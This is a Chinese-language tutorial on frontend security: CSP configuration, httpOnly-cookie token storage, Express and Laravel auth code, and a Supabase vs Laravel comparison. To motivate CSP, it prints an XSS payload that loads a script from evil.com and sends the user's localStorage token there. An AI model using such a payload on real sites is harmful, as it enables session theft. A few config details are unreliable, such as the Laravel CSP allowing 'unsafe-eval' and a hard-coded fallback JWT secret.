# 前端安全防護與 CSP 完整指南

## 目錄
1. [核心觀念](#核心觀念)
2. [CSP (Content Security Policy) 設定](#csp-content-security-policy-設定)
3. [安全最佳實踐](#安全最佳實踐)
4. [httpOnly Cookie 實作](#httponly-cookie-實作)
5. [後端選擇：Supabase vs Laravel](#後端選擇supabase-vs-laravel)

---

## 核心觀念

### 前端安全的根本原則

> **重要：前端永遠不安全，敏感資料不要碰前端**

#### 用戶永遠可以：
- ✅ 開啟 F12 開發者工具
- ✅ 讀取 localStorage / sessionStorage
- ✅ 讀取前端代碼（包括加密 key）
- ✅ 修改 JavaScript 變數
- ✅ 攔截網路請求
- ✅ 停用 JavaScript 執行

#### 無法阻止的行為：
```javascript
// ❌ 這些方法都無效
document.addEventListener('keydown', (e) => {
  if (e.key === 'F12') e.preventDefault()  // 可以右鍵 > 檢查
})

// ❌ 偵測 DevTools 開啟
setInterval(() => {
  if (window.outerHeight - window.innerHeight > 200) {
    alert('請關閉開發者工具')  // 用戶可忽略
  }
}, 1000)

// ❌ 無限 debugger
while(true) { debugger }  // 用戶可停用中斷點
```

### 安全等級對比

| 儲存方式 | 用戶可見 | XSS 可竊取 | CSRF 風險 | 適用場景 |
|---------|---------|-----------|----------|---------|
| localStorage | ✅ | ✅ | ❌ | 非敏感資料 |
| sessionStorage | ✅ | ✅ | ❌ | 臨時非敏感資料 |
| Cookie (一般) | ✅ | ✅ | ⚠️ | 不建議存 token |
| httpOnly Cookie | ❌ | ❌ | ⚠️ | **推薦存 token** |
| httpOnly + SameSite | ❌ | ❌ | ✅ | **最安全** |

---

## CSP (Content Security Policy) 設定

### CSP 的真正作用

CSP **不是**用來阻止用戶開 F12，而是**防止駭客注入惡意腳本（XSS 攻擊）**。

### 攻擊場景示例

#### 沒有 CSP 的情況：

```vue
<!-- 假設你的網站有 XSS 漏洞 -->
<template>
  <div v-html="userComment"></div>  <!-- ⚠️ 危險 -->
</template>

<script setup>
// 駭客在留言中輸入：
const userComment = `
  <script src="https://evil.com/steal-token.js"></script>
  <img src="x" onerror="fetch('https://evil.com/log?token=' + localStorage.getItem('token'))">
`
// ❌ 沒有 CSP：惡意腳本執行，token 被竊取
</script>
```

#### 有 CSP 的情況：

```javascript
// ✅ 有 CSP：瀏覽器阻止載入 evil.com 的腳本
// Console 顯示：
// Refused to load script from 'https://evil.com/steal-token.js'
// because it violates the Content-Security-Policy directive
```

---

### CSP 設定方式

#### 方式 1：HTML Meta 標籤

```html
<!-- index.html -->
<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- CSP 設定 -->
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'wasm-unsafe-eval';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.yourapp.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  ">

  <title>Your App</title>
</head>
<body>
  <div id="app"></div>
  <script type="module" src="/src/main.ts"></script>
</body>
</html>
```

#### 方式 2：後端設定 Header（推薦）

**Node.js + Express：**

```javascript
// server/index.js
import express from 'express'
import helmet from 'helmet'

const app = express()

// 使用 helmet 套件（推薦）
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'wasm-unsafe-eval'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'"],
      connectSrc: ["'self'", "https://api.yourapp.com"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"]
    }
  }
}))

// 或手動設定
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'"
  )
  next()
})

app.listen(3000)
```

**Laravel：**

```php
// app/Http/Middleware/SetSecurityHeaders.php
<?php

namespace App\Http\Middleware;

use Closure;

class SetSecurityHeaders
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);

        $response->headers->set('Content-Security-Policy',
            "default-src 'self'; " .
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " .
            "style-src 'self' 'unsafe-inline'; " .
            "img-src 'self' data: https:; " .
            "font-src 'self'; " .
            "connect-src 'self' https://api.yourapp.com"
        );

        return $response;
    }
}

// app/Http/Kernel.php
protected $middleware = [
    \App\Http\Middleware\SetSecurityHeaders::class,
    // ...
];
```

---

### CSP 指令說明

| 指令 | 說明 | 範例 |
|-----|------|------|
| `default-src` | 預設來源 | `'self'` 只允許同源 |
| `script-src` | JavaScript 來源 | `'self' https://cdn.com` |
| `style-src` | CSS 來源 | `'self' 'unsafe-inline'` |
| `img-src` | 圖片來源 | `'self' data: https:` |
| `font-src` | 字型來源 | `'self'` |
| `connect-src` | API 請求來源 | `'self' https://api.com` |
| `frame-ancestors` | 可嵌入此頁面的來源 | `'none'` 禁止被嵌入 |
| `base-uri` | `<base>` 標籤限制 | `'self'` |
| `form-action` | 表單提交目標 | `'self'` |

#### 特殊關鍵字：

- `'self'` - 同源（同協議、域名、端口）
- `'none'` - 禁止所有來源
- `'unsafe-inline'` - 允許 inline script/style（不安全，盡量避免）
- `'unsafe-eval'` - 允許 eval()（不安全）
- `'wasm-unsafe-eval'` - 允許 WebAssembly（Vite 需要）

---

### Vite 專用 CSP 設定

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'wasm-unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self' ws://localhost:* https://api.yourapp.com;
">

<!--
  注意：
  - script-src 需要 'wasm-unsafe-eval' 給 Vite HMR
  - style-src 需要 'unsafe-inline' 給 Vue SFC 的 scoped style
  - connect-src 需要 ws://localhost:* 給開發環境 HMR
-->
```

#### 開發/生產環境分離：

```typescript
// vite.config.ts
import { defineConfig } from 'vite'
import vue from '@vitejs/plugin-vue'

export default defineConfig(({ mode }) => {
  const csp = mode === 'production'
    ? "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    : "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'self' ws://localhost:*"

  return {
    plugins: [
      vue(),
      {
        name: 'html-transform',
        transformIndexHtml(html) {
          return html.replace(
            '</head>',
            `<meta http-equiv="Content-Security-Policy" content="${csp}"></head>`
          )
        }
      }
    ]
  }
})
```

---

## 安全最佳實踐

### 1. Token 儲存：httpOnly Cookie（推薦）

#### ❌ 錯誤做法：

```typescript
// 前端儲存 token
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...')

// 問題：
// 1. 任何人開 F12 都能看到
// 2. XSS 攻擊可竊取
// 3. 前端加密也沒用（key 在前端代碼裡）
```

#### ✅ 正確做法：

```typescript
// 後端設定 httpOnly cookie
// Token 永遠不會出現在前端 JavaScript 中
```

---

### 2. Pinia 持久化配置

```typescript
// stores/auth.ts
import { defineStore } from 'pinia'

export const useAuthStore = defineStore('auth', {
  state: () => ({
    user: null as User | null,
    isLoggedIn: false
    // ❌ 不要存 token！
  }),

  actions: {
    async login(username: string, password: string) {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',  // ⭐ 重要：攜帶 cookie
        body: JSON.stringify({ username, password })
      })

      if (!res.ok) throw new Error('Login failed')

      const data = await res.json()
      // Token 已經在 httpOnly cookie 裡
      this.user = data.user
      this.isLoggedIn = true
    },

    async logout() {
      await fetch('/api/logout', {
        method: 'POST',
        credentials: 'include'
      })
      this.$reset()
    }
  },

  persist: {
    // ✅ 只持久化非敏感資料
    paths: ['user.name', 'user.avatar', 'user.email'],
    storage: sessionStorage  // 關閉頁面就清除
  }
})
```

---

### 3. Axios 全域配置

```typescript
// utils/axios.ts
import axios from 'axios'
import { useAuthStore } from '@/stores/auth'
import { useRouter } from 'vue-router'

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL || '/api',
  withCredentials: true,  // ⭐ 自動攜帶 cookie
  timeout: 10000
})

// 請求攔截器
api.interceptors.request.use(
  config => {
    // httpOnly cookie 會自動帶上，不需手動設定
    return config
  },
  error => Promise.reject(error)
)

// 回應攔截器
api.interceptors.response.use(
  response => response,
  error => {
    if (error.response?.status === 401) {
      // Token 過期或無效
      const authStore = useAuthStore()
      authStore.$reset()

      const router = useRouter()
      router.push('/login')
    }
    return Promise.reject(error)
  }
)

export default api
```

---

## httpOnly Cookie 實作

### 後端實作範例

#### Node.js + Express + JWT

```bash
npm install express jsonwebtoken bcrypt cookie-parser cors
```

```javascript
// server/index.js
import express from 'express'
import jwt from 'jsonwebtoken'
import bcrypt from 'bcrypt'
import cookieParser from 'cookie-parser'
import cors from 'cors'

const app = express()

// 中間件
app.use(express.json())
app.use(cookieParser())
app.use(cors({
  origin: 'http://localhost:5173',  // Vite 開發伺服器
  credentials: true  // 允許攜帶 cookie
}))

// 模擬資料庫
const users = [
  {
    id: 1,
    username: 'admin',
    password: '$2b$10$...',  // bcrypt hash
    email: 'admin@example.com'
  }
]

// JWT 秘鑰（生產環境用環境變數）
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production'

// 登入
app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body

    // 驗證
    const user = users.find(u => u.username === username)
    if (!user) {
      return res.status(401).json({ error: '帳號或密碼錯誤' })
    }

    const isValid = await bcrypt.compare(password, user.password)
    if (!isValid) {
      return res.status(401).json({ error: '帳號或密碼錯誤' })
    }

    // 簽發 JWT
    const token = jwt.sign(
      { userId: user.id, username: user.username },
      JWT_SECRET,
      { expiresIn: '7d' }
    )

    // ✅ 設定 httpOnly cookie
    res.cookie('token', token, {
      httpOnly: true,      // ⭐ JavaScript 無法讀取
      secure: process.env.NODE_ENV === 'production',  // HTTPS only
      sameSite: 'strict',  // 防 CSRF
      maxAge: 7 * 24 * 60 * 60 * 1000  // 7天
    })

    // 回傳非敏感資料
    res.json({
      user: {
        id: user.id,
        username: user.username,
        email: user.email
      }
    })
  } catch (error) {
    console.error('Login error:', error)
    res.status(500).json({ error: '伺服器錯誤' })
  }
})

// 登出
app.post('/api/logout', (req, res) => {
  res.clearCookie('token')
  res.json({ message: '登出成功' })
})

// 驗證中間件
function authMiddleware(req, res, next) {
  const token = req.cookies.token

  if (!token) {
    return res.status(401).json({ error: '未登入' })
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET)
    req.userId = decoded.userId
    req.username = decoded.username
    next()
  } catch (error) {
    res.status(401).json({ error: 'Token 無效或過期' })
  }
}

// 受保護的路由
app.get('/api/profile', authMiddleware, (req, res) => {
  const user = users.find(u => u.id === req.userId)
  res.json({
    user: {
      id: user.id,
      username: user.username,
      email: user.email
    }
  })
})

// 其他受保護的 API
app.get('/api/posts', authMiddleware, (req, res) => {
  res.json({ posts: [] })
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`)
})
```

#### 生成 bcrypt 密碼範例：

```javascript
// scripts/hash-password.js
import bcrypt from 'bcrypt'

const password = 'admin123'
const hash = await bcrypt.hash(password, 10)
console.log('Hash:', hash)
// 將此 hash 存入資料庫
```

---

### Cookie 屬性詳解

| 屬性 | 作用 | 建議值 |
|-----|------|-------|
| `httpOnly` | 禁止 JavaScript 讀取 | `true` ⭐ |
| `secure` | 只在 HTTPS 傳輸 | 生產環境 `true` |
| `sameSite` | 防 CSRF 攻擊 | `'strict'` 或 `'lax'` |
| `maxAge` | 有效期限（毫秒） | 7天 = `604800000` |
| `domain` | 可用域名 | 預設當前域名 |
| `path` | 可用路徑 | 預設 `/` |

#### SameSite 選項：

- `strict` - 最嚴格，任何跨站請求都不帶 cookie（推薦）
- `lax` - 允許 GET 導航（點擊連結），但不允許 POST 跨站
- `none` - 允許所有跨站請求（需搭配 `secure: true`）

---

### 前端呼叫範例

```typescript
// composables/useAuth.ts
import api from '@/utils/axios'
import { useAuthStore } from '@/stores/auth'

export function useAuth() {
  const authStore = useAuthStore()

  async function login(username: string, password: string) {
    try {
      const { data } = await api.post('/login', { username, password })
      // Cookie 已自動設定，不需處理
      authStore.user = data.user
      authStore.isLoggedIn = true
      return data
    } catch (error) {
      throw new Error('登入失敗')
    }
  }

  async function logout() {
    await api.post('/logout')
    authStore.$reset()
  }

  async function fetchProfile() {
    const { data } = await api.get('/profile')
    return data
  }

  return { login, logout, fetchProfile }
}
```

```vue
<!-- pages/Login.vue -->
<template>
  <form @submit.prevent="handleLogin">
    <input v-model="username" placeholder="帳號" />
    <input v-model="password" type="password" placeholder="密碼" />
    <button type="submit">登入</button>
  </form>
</template>

<script setup lang="ts">
import { ref } from 'vue'
import { useRouter } from 'vue-router'
import { useAuth } from '@/composables/useAuth'

const router = useRouter()
const { login } = useAuth()

const username = ref('')
const password = ref('')

async function handleLogin() {
  try {
    await login(username.value, password.value)
    router.push('/dashboard')
  } catch (error) {
    alert('登入失敗')
  }
}
</script>
```

---

## 後端選擇：Supabase vs Laravel

### Supabase（推薦新手快速開發）

#### 優點：
- ✅ 全自動後端（資料庫、認證、儲存、即時訂閱）
- ✅ 內建 Row Level Security (RLS)
- ✅ 自動生成 RESTful API
- ✅ 免費額度大（500MB 資料庫、1GB 儲存、2GB 流量/月）
- ✅ 支援 PostgreSQL 所有功能
- ✅ 開箱即用的認證（Email、Google、GitHub 等）

#### 缺點：
- ❌ 客製化程度較低
- ❌ 複雜業務邏輯需寫 Edge Functions
- ❌ 鎖定 PostgreSQL

---

### Supabase 快速開始

#### 1. 安裝與初始化

```bash
npm install @supabase/supabase-js
```

```typescript
// utils/supabase.ts
import { createClient } from '@supabase/supabase-js'

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY

export const supabase = createClient(supabaseUrl, supabaseAnonKey)
```

```env
# .env
VITE_SUPABASE_URL=https://your-project.supabase.co
VITE_SUPABASE_ANON_KEY=your-anon-key
```

---

#### 2. 認證實作

```typescript
// stores/auth.ts
import { defineStore } from 'pinia'
import { supabase } from '@/utils/supabase'

export const useAuthStore = defineStore('auth', {
  state: () => ({
    user: null,
    session: null
  }),

  actions: {
    // 註冊
    async signUp(email: string, password: string) {
      const { data, error } = await supabase.auth.signUp({
        email,
        password
      })
      if (error) throw error
      return data
    },

    // 登入
    async signIn(email: string, password: string) {
      const { data, error } = await supabase.auth.signInWithPassword({
        email,
        password
      })
      if (error) throw error

      this.user = data.user
      this.session = data.session
    },

    // Google 登入
    async signInWithGoogle() {
      const { data, error } = await supabase.auth.signInWithOAuth({
        provider: 'google'
      })
      if (error) throw error
    },

    // 登出
    async signOut() {
      await supabase.auth.signOut()
      this.$reset()
    },

    // 檢查登入狀態
    async checkAuth() {
      const { data: { session } } = await supabase.auth.getSession()
      if (session) {
        this.user = session.user
        this.session = session
      }
    }
  }
})
```

---

#### 3. 資料庫操作

```typescript
// composables/usePosts.ts
import { supabase } from '@/utils/supabase'

export function usePosts() {
  // 查詢
  async function fetchPosts() {
    const { data, error } = await supabase
      .from('posts')
      .select('*')
      .order('created_at', { ascending: false })

    if (error) throw error
    return data
  }

  // 新增
  async function createPost(title: string, content: string) {
    const { data, error } = await supabase
      .from('posts')
      .insert({ title, content })
      .select()

    if (error) throw error
    return data[0]
  }

  // 更新
  async function updatePost(id: number, updates: any) {
    const { data, error } = await supabase
      .from('posts')
      .update(updates)
      .eq('id', id)
      .select()

    if (error) throw error
    return data[0]
  }

  // 刪除
  async function deletePost(id: number) {
    const { error } = await supabase
      .from('posts')
      .delete()
      .eq('id', id)

    if (error) throw error
  }

  return { fetchPosts, createPost, updatePost, deletePost }
}
```

---

#### 4. Row Level Security (RLS) 設定

在 Supabase Dashboard 的 SQL Editor 執行：

```sql
-- 啟用 RLS
ALTER TABLE posts ENABLE ROW LEVEL SECURITY;

-- 允許所有人查看
CREATE POLICY "任何人可查看文章"
ON posts FOR SELECT
TO public
USING (true);

-- 只有作者可編輯
CREATE POLICY "作者可編輯自己的文章"
ON posts FOR UPDATE
TO authenticated
USING (auth.uid() = user_id);

-- 只有作者可刪除
CREATE POLICY "作者可刪除自己的文章"
ON posts FOR DELETE
TO authenticated
USING (auth.uid() = user_id);

-- 登入用戶可新增
CREATE POLICY "登入用戶可新增文章"
ON posts FOR INSERT
TO authenticated
WITH CHECK (auth.uid() = user_id);
```

---

#### 5. 即時訂閱

```typescript
// 監聽新文章
const channel = supabase
  .channel('posts-changes')
  .on('postgres_changes',
    { event: 'INSERT', schema: 'public', table: 'posts' },
    (payload) => {
      console.log('新文章:', payload.new)
    }
  )
  .subscribe()

// 取消訂閱
channel.unsubscribe()
```

---

### Laravel（推薦完全客製化）

#### 優點：
- ✅ 完全掌控所有邏輯
- ✅ 生態系完整（Eloquent ORM、Queue、Cache 等）
- ✅ 適合複雜業務邏輯
- ✅ 社群大、資源多
- ✅ 支援多種資料庫（MySQL、PostgreSQL、SQLite 等）

#### 缺點：
- ❌ 需要自己部署維護
- ❌ 開發速度較慢
- ❌ 需要學習 PHP

---

### Laravel 快速開始

#### 1. 安裝與建立專案

```bash
composer create-project laravel/laravel my-api
cd my-api

# 安裝 Sanctum (API 認證)
composer require laravel/sanctum
php artisan vendor:publish --provider="Laravel\Sanctum\SanctumServiceProvider"
php artisan migrate
```

---

#### 2. CORS 設定

```php
// config/cors.php
return [
    'paths' => ['api/*'],
    'allowed_origins' => ['http://localhost:5173'],
    'allowed_methods' => ['*'],
    'allowed_headers' => ['*'],
    'exposed_headers' => [],
    'max_age' => 0,
    'supports_credentials' => true,  // ⭐ 重要：支援 cookie
];
```

---

#### 3. 認證 API

```php
// routes/api.php
use App\Http\Controllers\AuthController;

Route::post('/register', [AuthController::class, 'register']);
Route::post('/login', [AuthController::class, 'login']);
Route::post('/logout', [AuthController::class, 'logout'])->middleware('auth:sanctum');
Route::get('/user', [AuthController::class, 'user'])->middleware('auth:sanctum');
```

```php
// app/Http/Controllers/AuthController.php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function register(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|unique:users',
            'password' => 'required|string|min:8'
        ]);

        $user = User::create([
            'name' => $validated['name'],
            'email' => $validated['email'],
            'password' => Hash::make($validated['password'])
        ]);

        $token = $user->createToken('auth-token')->plainTextToken;

        return response()->json([
            'user' => $user,
            'token' => $token
        ]);
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'email' => 'required|email',
            'password' => 'required'
        ]);

        $user = User::where('email', $credentials['email'])->first();

        if (!$user || !Hash::check($credentials['password'], $user->password)) {
            return response()->json(['message' => '帳號或密碼錯誤'], 401);
        }

        $token = $user->createToken('auth-token')->plainTextToken;

        // 設定 httpOnly cookie
        cookie()->queue(
            'token',
            $token,
            60 * 24 * 7,  // 7 天
            '/',
            null,
            true,   // secure
            true,   // httpOnly
            false,
            'strict'  // sameSite
        );

        return response()->json([
            'user' => $user
        ]);
    }

    public function logout(Request $request)
    {
        $request->user()->currentAccessToken()->delete();
        cookie()->queue(cookie()->forget('token'));

        return response()->json(['message' => '登出成功']);
    }

    public function user(Request $request)
    {
        return response()->json(['user' => $request->user()]);
    }
}
```

---

#### 4. 資源路由

```php
// routes/api.php
use App\Http\Controllers\PostController;

Route::middleware('auth:sanctum')->group(function () {
    Route::apiResource('posts', PostController::class);
});
```

```php
// app/Http/Controllers/PostController.php
<?php

namespace App\Http\Controllers;

use App\Models\Post;
use Illuminate\Http\Request;

class PostController extends Controller
{
    public function index()
    {
        return Post::with('user')->latest()->get();
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'title' => 'required|string|max:255',
            'content' => 'required|string'
        ]);

        $post = $request->user()->posts()->create($validated);

        return response()->json($post, 201);
    }

    public function show(Post $post)
    {
        return $post->load('user');
    }

    public function update(Request $request, Post $post)
    {
        $this->authorize('update', $post);

        $validated = $request->validate([
            'title' => 'string|max:255',
            'content' => 'string'
        ]);

        $post->update($validated);

        return response()->json($post);
    }

    public function destroy(Post $post)
    {
        $this->authorize('delete', $post);

        $post->delete();

        return response()->json(null, 204);
    }
}
```

---

### 比較表格

| 項目 | Supabase | Laravel |
|-----|----------|---------|
| 學習曲線 | 低 | 中 |
| 開發速度 | 快 | 中 |
| 客製化 | 中 | 高 |
| 部署難度 | 無（託管） | 中 |
| 成本 | 免費額度大 | 需自己架設 |
| 即時功能 | ✅ 內建 | ❌ 需自己實作 |
| 認證 | ✅ 內建多種方式 | ⚠️ 需安裝套件 |
| 適合場景 | MVP、中小型專案 | 複雜業務、大型專案 |

---

## 總結與建議

### 安全檢查清單 ✅

- [ ] 設定 CSP Header 或 Meta 標籤
- [ ] Token 使用 httpOnly Cookie 儲存
- [ ] Cookie 設定 `SameSite=Strict`
- [ ] 生產環境啟用 `Secure` flag
- [ ] Pinia 只持久化非敏感資料
- [ ] Axios 設定 `withCredentials: true`
- [ ] 避免使用 `v-html` 渲染用戶輸入
- [ ] 所有用戶輸入進行驗證（前後端都要）
- [ ] 密碼使用 bcrypt 或 argon2 hash
- [ ] API 回傳錯誤不洩漏敏感資訊

---

### 後端選擇建議

#### 選擇 Supabase 如果：
- 🚀 快速 MVP / 原型開發
- 👨‍💻 團隊前端為主，不熟後端
- 💰 預算有限，想省伺服器成本
- ⚡ 需要即時功能（聊天室、協作工具）

#### 選擇 Laravel 如果：
- 🎯 複雜業務邏輯
- 🔧 需要完全掌控
- 📊 已有 MySQL 資料庫
- 👥 團隊有 PHP 經驗

#### 選擇 Node.js + Express 如果：
- 🌐 前後端都用 JavaScript/TypeScript
- ⚡ 需要高並發處理
- 🎨 完全客製化但想輕量
- 📦 生態系與 Vue 整合度高

---

### 下一步

1. **立即實作**：
   - 在專案加入 CSP 設定
   - 將 token 改為 httpOnly cookie
   - 更新 Pinia persist 配置

2. **選擇後端**：
   - 簡單專案 → Supabase
   - 複雜專案 → Laravel
   - 中間選擇 → Node.js

3. **學習資源**：
   - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
   - [Supabase 官方文檔](https://supabase.com/docs)
   - [Laravel 官方文檔](https://laravel.com/docs)

---

## 參考資料

- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP - XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HTTP Cookie 安全](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Supabase Auth](https://supabase.com/docs/guides/auth)
- [Laravel Sanctum](https://laravel.com/docs/sanctum)
